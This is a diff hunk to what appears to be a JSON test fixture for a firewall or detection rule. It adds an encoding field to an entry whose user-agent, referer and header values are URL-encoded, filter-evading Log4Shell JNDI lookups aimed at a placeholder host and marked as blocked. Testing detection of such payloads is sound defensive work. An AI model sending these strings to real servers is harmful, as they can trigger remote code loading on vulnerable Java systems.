@@ -8,6 +8,7 @@
       "USER-AGENT": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
       "REFERER": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
       "HEADER": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "ENCODE": "Base64 UTF-16",
       "BLOCKED": true
     }
   ]
